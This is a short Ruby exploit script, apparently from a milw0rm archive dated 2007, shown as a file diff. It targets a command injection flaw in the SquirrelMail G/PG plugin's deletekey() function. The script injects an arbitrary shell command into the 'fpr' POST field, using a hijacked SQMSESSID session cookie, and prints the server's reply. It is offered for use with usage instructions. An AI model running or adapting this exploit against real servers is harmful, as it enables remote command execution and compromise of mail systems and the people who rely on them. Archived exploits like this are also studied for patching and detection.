@@ -1,0 +1,43 @@
+#!/usr/local/bin/ruby
+
+puts"http://backdoored.net\n"
+puts "SquirrelMail G/PG deletekey() command injection exploit\n"
+puts "http://backdoored.net    Visit Us\n"
+puts "Coded by Backdoored member.   \n" 
+puts "--------------------------------------------------\n"
+
+if ARGV[0] == nil && ARGV[1] == nil && ARGV[2] ==  nil && ARGV[3] == nil && ARGV[4] == nil && ARGV[5] == nil
+puts "Usage: ./squ_xploit  hostname path port cookie command 0\n"
+puts "if host using ssl use 1 instead of 0\n"
+exit
+end
+
+require 'net/http'
+require 'net/https'
+
+host = ARGV[0].to_s
+port = ARGV[2].to_i
+cookie = ARGV[3].to_s
+victim = Net::HTTP.new(host,port)
+	if ARGV[3].to_i == 1
+	puts "Entering SSL mode baby\n"
+	victim.use_ssl = true
+	end
+command = ARGV[4].to_s
+#path = '/sq/plugins/gpg/modules/keyring_main.php'
+path = ARGV[1].to_s
+data = "id=C5B1611B8E71C***&fpr= | " + command + "| &pos=0&sort=email_name&desc=&srch=&ring=all&passphrase=&deletekey=true&deletepair=false&trust=1"
+pizza = "key=pYWrEbVTY%2Bc%3D; SQMSESSID=" + cookie;
+headers = {
+  'Cookie' => pizza,
+  'Referer' => 'http://www.google.com',
+  'Content-Type' => 'application/x-www-form-urlencoded'
+}
+resp, data = victim.post(path,data,headers)
+puts 'Message = ' + resp.message
+puts  'Code = ' + resp.code
+
+resp.each {|key,val| puts key + ' = ' + val}
+#puts data
+
+# milw0rm.com [2007-12-11]
